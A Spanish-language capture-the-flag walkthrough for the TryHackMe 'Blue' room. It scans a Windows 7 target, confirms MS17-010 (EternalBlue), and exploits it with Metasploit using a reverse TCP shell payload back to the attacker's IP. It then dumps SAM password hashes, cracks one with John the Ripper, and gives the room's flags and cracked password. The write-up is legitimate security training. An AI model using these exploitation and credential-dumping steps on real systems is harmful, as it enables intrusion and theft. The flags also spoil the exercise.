# Blue

Blue

![image.png](./imagenes/Blue/image.png)

Maquinas que vamos a usar Kali Linux y https://tryhackme.com/room/blue

Mi IP: `10.21.203.172`

```bash
ifconfig
```

![image.png](./imagenes/Blue/57e7afd7-2588-4e50-9228-14660e941a5f.png)

IP maquina victima: `10.10.153.192`

![image.png](./imagenes/Blue/image%201.png)

---

- Hacemos una enumeración de puertos
    
    ```bash
    sudo nmap -p- -sS -sV -sC --open -min-rate 5000 -n -vvv -Pn 10.10.153.192
    ```
    
    ![image.png](./imagenes/Blue/image%202.png)
    
    Nos llama la atención el puerto “445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds” Ya que es un candidato a la vulnerabilidad EternalBlue.
    
- Vamos a ver si es vulnerable
    
    ```bash
    nmap --script smb-vuln-ms17-010 -p445 10.10.153.192
    ```
    
    ![image.png](./imagenes/Blue/image%203.png)
    
    Vemos que es vulnerable .
    
- Vamos a usar Metasploit para aprovechar la vulnerabilidad.
    - Buscamos la vulnerabilidad por el CVE
        
        `search CVE:CVE-2017-0143`
        
        ![image.png](./imagenes/Blue/image%204.png)
        
    
    - Usamos la opción 2 y rellenamos los datos que sean necesarios en el exploit.
        
        `use 2`
        
        `show options`
        
        ![image.png](./imagenes/Blue/image%205.png)
        
        `set payload windows/x64/shell/reverse_tcp`
        
        `set RHOSTS 10.10.153.192
         set LHOST 10.21.203.172`
        
        `run`
        
        ![image.png](./imagenes/Blue/image%206.png)
        
        ![image.png](./imagenes/Blue/image%207.png)
        
        **¡¡OJO!! Esta maquina falla mucho si fala repetidamente el exploit quizás debas apagar la maquina victima y volverla a encender.**
        
    - Pulsamos `CTRL+Z` para pasar la sesión a **background**.
    
    - Vamos a convertir la sesión de shell en una sesión Meterpreter.
        
        `use post/multi/manage/shell_to_meterpreter`
        
    - Miramos las opciones
        
        `show options`
        
        ![image.png](./imagenes/Blue/image%208.png)
        

- Miramos la ID de sesion que tenemos en background.
    
    `sessions -l`
    
    ![image.png](./imagenes/Blue/image%209.png)
    

- Introducimos el dato de SESSION que necesitábamos
    
    `set SESSION 1`
    
    ![image.png](./imagenes/Blue/image%2010.png)
    
- Lanzamos el modulo
    
    `run`
    
    ![image.png](./imagenes/Blue/image%2011.png)
    
- Si volvemos a listar las sesión activas veremos que ahora tenemos 2 y además la nueva sesión somos **NT AUTHORITY\SYSTEM**
    
    `sessions -l`
    
    ![image.png](./imagenes/Blue/image%2012.png)
    

- Entramos en la nueva sesión de meterpreter.
    
    `sessions -i 2`
    
    ![image.png](./imagenes/Blue/image%2013.png)
    

- Miramos que usuario está ejecutando tu sesión actual
    
    `getuid`
    
    ![image.png](./imagenes/Blue/image%2014.png)
    

- Extraemos los hashes de contraseñas almacenados en la base SAM (Security Account Manager) de Windows.
    
    `hashdump`
    
    ![image.png](./imagenes/Blue/image%2015.png)
    

- Copiamos el hash de Jon en un archivo llamado jon.hash
    
    ```bash
    nano jon.hash
    ```
    
    ![image.png](./imagenes/Blue/image%2016.png)
    
    ![image.png](./imagenes/Blue/image%2017.png)
    

- Vamos a usar John the Ripper para descifrar la contraseña del hash.
    
    ```bash
    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.hash 
    ```
    
    ![image.png](./imagenes/Blue/image%2018.png)
    
    Contraseña: `alqfna22`
    

- Volvemos a la sesión de meterpreter que teníamos abierta. y Cambiamos la shell por una del sistema.
    
    `shell`
    
    ![image.png](./imagenes/Blue/image%2019.png)
    

- Flag1 que esta en la raíz del sistema: `C:\`
    
    ![image.png](./imagenes/Blue/image%2020.png)
    
    ![image.png](./imagenes/Blue/image%2021.png)
    
    `flag{access_the_machine}`
    
- Flag2 esta en la carpeta donde *se almacenan las contraseñas dentro de Windows: `C:\Windows\System32\config`*
    
    ![image.png](./imagenes/Blue/image%2022.png)
    
    flag{sam_database_elevated_access}
    
- Flag3 esta en `C:\Users\Jon\Documents`
    
    ![image.png](./imagenes/Blue/image%2023.png)
    
    `flag{admin_documents_can_be_valuable}`